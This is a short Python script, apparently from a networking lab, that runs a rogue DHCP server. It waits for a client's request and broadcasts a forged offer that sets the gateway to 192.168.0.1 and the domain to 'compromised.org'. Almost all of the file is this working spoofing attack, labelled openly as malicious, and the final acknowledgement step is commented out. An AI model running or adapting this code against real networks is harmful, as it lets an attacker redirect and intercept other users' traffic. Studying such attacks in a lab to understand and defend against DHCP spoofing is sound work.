import sys
import os.path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), os.path.pardir)))
import random
from server import Server
import threading
import packet


unpleaseant_ip = [192, 168, 0, 69]

def fulfillRequirements(mal_packet):
    client_requirements = mal_packet._DHCPOptions_dict[55]
    mal_packet.purgeOptions()
    for req in client_requirements:
        if int(req) == 1:
            mal_packet.addOption(1, [255, 255, 255, 0])
        if int(req) == 3:
            mal_packet.addOption(3, [192, 168, 0, 1])
        if int(req) == 15:
            string = "compromised.org"
            mal_packet.addOption(15, [ord(s) for s in list(string)])

def createMalciousPacket(response):
    mal_packet = response
    print(response._DHCPOptions_dict)


    mal_packet.OP = bytes([0x02])
    mal_packet.Magiccookie = bytes([0x63, 0x82, 0x53, 0x63])
    mal_packet.addOption(53, 2)
    fulfillRequirements(mal_packet)
    mal_packet.addOption(51, [0, 0, 14, 16])
    mal_packet.addOption(255, 255)
    return mal_packet

malicious_server = Server()
malicious_server.awaitMessage()
malicious_offer = createMalciousPacket(malicious_server.response)
malicious_server.sendMessage(malicious_offer, malicious_server.client_broadcast)
malicious_server.awaitMessage()
# malicious_server.sendAck()